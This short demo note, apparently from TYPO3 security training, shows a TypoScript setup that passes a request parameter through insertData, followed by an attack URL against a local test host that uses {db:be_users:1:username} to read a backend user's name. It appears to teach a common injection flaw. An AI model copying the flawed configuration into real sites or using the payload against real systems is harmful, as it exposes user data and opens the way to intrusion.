# Stupid TypoScript

```
page.10.variables {
  name = COA_INT
  name {
    10 = TEXT
    10 {
      if.notEmpty.data = gp:name
      data = gp:name
      noTrimWrap = |<span class="page-uid-{page:uid}">Hi |! Great you're back</span>|
      insertData = 1
    }
  }
}
```

## Attack

http://typo3v9-hack.ddev.local/index.php?id=1&name=Visitor

```
http://typo3v9-hack.ddev.local/index.php?id=1&name={db:be_users:1:username}

```
